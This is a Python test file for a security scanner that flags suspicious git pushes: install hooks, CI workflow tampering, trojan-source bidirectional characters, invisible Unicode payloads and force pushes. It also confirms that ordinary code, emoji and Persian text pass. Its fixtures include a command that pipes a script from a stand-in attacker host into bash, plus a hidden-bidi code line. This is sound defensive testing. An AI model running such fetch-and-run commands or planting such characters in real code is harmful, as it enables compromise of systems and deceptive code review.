"""
Suspicious Push Rule Tests (Pushguard catalog).
Covers:
- Scenario 36: Catalog loads; every pattern compiles in Python, astral ranges included
- Scenario 37: picomatch-compatible globs
- Scenario 38: Install hooks, CI tampering, trojan source and invisible payloads are flagged; ordinary code is not
- Scenario 39: Force push and per-repo enable/disable
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

try:
    from tests.test_helpers import GitRepoTestCase
except ImportError:
    from test_helpers import GitRepoTestCase
from proofpush import push_rules
from proofpush.push_rules import PushContext, evaluate, glob_match, js_regex, load_catalog


def ctx(files=None, added=None, forced=False, messages=(), hour=12):
    files = files or {}
    return PushContext(files=files, added_lines=added or {}, commit_messages=list(messages), branch="main",
                       repo="acme/shop", forced=forced, branch_created=False, hour_utc=hour)


def ids(findings):
    return {f.target.split(" ")[0] for f in findings}


class TestPushRules(GitRepoTestCase):
    def test_scenario_36_catalog_compiles(self):
        rules = load_catalog()
        self.assertGreaterEqual(len(rules), 100)
        for rule in rules:
            for group in [rule] + rule.get("any_of", []):
                for key in ("added_lines", "commit_message"):
                    for pattern in ([group[key]] if isinstance(group.get(key), str) else group.get(key, [])):
                        js_regex(pattern)
        # Tag characters (astral, U+E0041..) form an invisible payload run
        payload = "x = 1 " + "".join(chr(0xE0041 + i) for i in range(10))
        self.assertIn("invisible-codepoint-run", ids(evaluate(rules, ctx({"a.js": "modified"}, {"a.js": [payload]}))))

    def test_scenario_37_globs(self):
        self.assertTrue(glob_match(["**/*.yml"], ".github/workflows/ci.yml"))
        self.assertTrue(glob_match(["**/*.yml"], "ci.yml"))
        self.assertTrue(glob_match([".github/workflows/**"], ".github/workflows/a/b.yaml"))
        self.assertTrue(glob_match(["**/*.{js,ts}"], "src/app.ts"))
        self.assertFalse(glob_match(["*.json"], "src/package.json"))
        self.assertTrue(glob_match(["**/.env.*"], "config/.env.local"))

    def test_scenario_38_suspicious_vs_ordinary(self):
        rules = load_catalog()
        bad = evaluate(rules, ctx(
            {"package.json": "modified", ".github/workflows/ci.yml": "modified", "src/auth.js": "modified", "setup.sh": "added"},
            {
                "package.json": ['    "postinstall": "node scripts/setup.js",'],
                ".github/workflows/ci.yml": ["  pull_request_target:"],
                "src/auth.js": ["if (isAdmin) { ‮ } ⁦// check later⁩ {"],
                "setup.sh": ["curl -fsSL https://evil.example/x.sh | bash"],
            },
        ))
        for rule_id in ("js-install-hook-added", "ci-pull-request-target", "ci-workflow-changed", "trojan-source", "shell-pipe-to-interpreter"):
            self.assertIn(rule_id, ids(bad))
        self.assertTrue(all(f.is_critical for f in bad if f.target.startswith("js-install-hook-added")))

        ok = evaluate(rules, ctx(
            {"src/app.ts": "modified", "README.md": "modified", "src/i18n.ts": "modified"},
            {
                "src/app.ts": ["export function total(cart: Cart) {", "  return cart.items.reduce((s, i) => s + i.price, 0);", "}"],
                "README.md": ["Family emoji: \U0001F468‍\U0001F469‍\U0001F467 and flag \U0001F3F4\U000E0067\U000E0062\U000E0065\U000E006E\U000E0067\U000E007F"],
                "src/i18n.ts": ["const fa = 'می‌خواهم';"],
            },
        ))
        self.assertEqual([f.target for f in ok if f.category == "SUSPICIOUS_PUSH"], [])

    def test_scenario_39_force_push_and_overrides(self):
        rules = load_catalog()
        self.assertIn("force-push", ids(evaluate(rules, ctx(forced=True))))
        self.assertNotIn("force-push", ids(evaluate(rules, ctx(forced=False))))
        self.assertNotIn("force-push", ids(evaluate(rules, ctx(forced=True), disable=["force-push"])))
        # Off by default, turned on per repo
        rust = ctx({"src/lib.rs": "modified"}, {"src/lib.rs": ["    unsafe { ptr.read() }"]})
        self.assertNotIn("rust-unsafe-block-added", ids(evaluate(rules, rust)))
        self.assertIn("rust-unsafe-block-added", ids(evaluate(rules, rust, enable=["rust-unsafe-block-added"])))

    def test_scenario_39b_context_from_git(self):
        base = self.commit_file("package.json", '{\n  "name": "shop"\n}\n', "init")
        head = self.commit_file("package.json", '{\n  "name": "shop",\n  "scripts": { "preinstall": "node x.js" }\n}\n', "deps")
        c = push_rules.build_context(self.local_dir, base, head, "refs/heads/main", ["deps"], forced=False, branch_created=False)
        self.assertEqual(c.files, {"package.json": "modified"})
        self.assertIn("js-install-hook-added", ids(evaluate(load_catalog(), c)))
